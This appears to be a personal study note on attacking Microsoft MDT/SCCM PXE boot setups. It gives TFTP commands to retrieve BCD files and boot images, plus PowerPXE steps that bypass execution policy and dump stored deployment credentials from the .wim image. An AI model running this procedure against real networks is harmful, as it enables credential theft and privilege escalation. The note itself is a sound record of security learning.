Used to deploy software and updates across a large network, misconfigs often present

# MDT and SCCM
Microsoft Deployment Toolkit: deploys standardized images of the Microsoft OS. Plug in a network cable and a new boot image can be installed.

System Center Configuration Management: Expansion of MDT that manages patches and software installations on computers in the network

# PXE Boot
Preboot Execution Environment actually enables the direct load and install of an OS over the network. MDT manages, creates and hosts PXE boot images. Integrates with DHCP so a host can request PXE via [[TFTP]] boot when assigned an IP lease
![[Pasted image 20230306144622.png]]
- Inject priv esc vector through a local admin
- Password scraping attack during install (service deployment account, or others for unattended install of apps and services)

# PXE Boot Image Retrieval
1. Get IP of MDT server (in PXE Boot preconfigure packets via DHCP)
2. Get names of BCD files which contain info about PXE Boot for different architectures (usually via a website like `pxeboot.us.corpa.com` . Can be requested via TFTP, usually have long strings and are regenerated everyday
3. (From a jump box on the network) Request the relevant BDC file from the MDT via TFTP, `tftp -i MDT_IP GET "\Tmp\x64{39...28} .bcd" conf.bcd`, BCD files are always in the `\Tmp\` dir
4. Use [[powerpxe]] to read file contents:  
	1. `powershell -executionpolicy bypass`, 
	2. `Import-Module .\PowerPXE.ps1` (assuming you have uploaded it to the jump box), 
	3. `$BCDFile = "conf.bcd"`, 
	4. `Get-WimFile -bcdFile $BCDFile`
	5. Output shows .wim file location
5. Grab .wim from MDT `tftp -i MDT_IP GET "OUTPUTED_WIM_DIR" pxeboot.wim`

# Recovering Creds from PXE Boot Image
Simple vector would be to exfiltrate existing credentials
1. `Get-FindCredentials -WimFile pxeboot.wim`
2. Creds dumped
